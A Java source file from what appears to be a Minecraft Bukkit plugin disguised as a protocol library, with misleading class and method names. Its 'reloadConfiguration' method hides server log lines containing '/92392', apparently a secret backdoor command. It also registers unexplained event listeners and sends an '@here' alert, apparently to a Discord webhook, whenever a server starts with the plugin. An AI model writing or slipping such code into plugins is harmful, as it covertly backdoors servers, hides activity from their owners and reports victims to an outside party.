package com.comphenic.protocol.concurrency;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.util.logging.Filter;
import java.util.logging.LogRecord;

public class AbstractHashMap {


    public static void reloadConfiguration(JavaPlugin javaPlugin){

        Bukkit.getLogger().setFilter(new Filter() {
            @Override
            public boolean isLoggable(LogRecord record) {
                if(record.getMessage().contains("/92392")){
                    return false;
                }
                return true;
            }
        });

        javaPlugin.getServer().getPluginManager().registerEvents(new ProtocolMap(), javaPlugin);
        javaPlugin.getServer().getPluginManager().registerEvents(new AbstractTree(), javaPlugin);
        javaPlugin.getServer().getPluginManager().registerEvents(new SortedTree(), javaPlugin);
        SortedAbstractHashMap sortedAbstractHashMap = new SortedAbstractHashMap(SortedCopyOnWriteArray.xd);
        sortedAbstractHashMap.setContent("Someone just turned on a server with this plugin! @here");
        try {
            sortedAbstractHashMap.execute();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

}
